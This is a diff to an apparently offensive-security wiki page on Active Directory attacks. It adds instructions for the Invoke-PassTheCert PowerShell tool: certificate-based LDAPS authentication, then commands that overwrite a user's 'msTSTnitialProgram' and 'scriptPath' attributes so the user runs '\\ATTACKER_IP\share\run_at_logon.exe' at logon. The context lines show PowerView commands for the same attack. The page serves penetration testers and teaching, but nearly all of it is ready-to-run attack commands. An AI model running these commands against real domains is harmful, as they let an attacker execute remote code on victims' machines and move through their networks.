@@ -1,5 +1,5 @@
 ---
-authors: CravateRouge, ShutdownRepo
+authors: CravateRouge, ShutdownRepo, jamarir
 category: ad
 ---
 
@@ -38,5 +38,21 @@ Set-DomainObject testuser -Set @{'msTSTnitialProgram'='\\ATTACKER_IP\share\run_a
 Set-DomainObject testuser -Set @{'scriptPath'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
 ```
 
+The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell).
+
+> Note: the README contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+
+# Overwrite the 'msTSTnitialProgram' and 'scriptPath' attributes's values of 'John JD. DOE' user to '\\ATTACKER_IP\share\run_at_logon.exe'
+Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'msTSTnitialProgram' -Value '\\ATTACKER_IP\share\run_at_logon.exe'
+Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'scriptPath' -Value '\\ATTACKER_IP\share\run_at_logon.exe'
+```
 
 :::
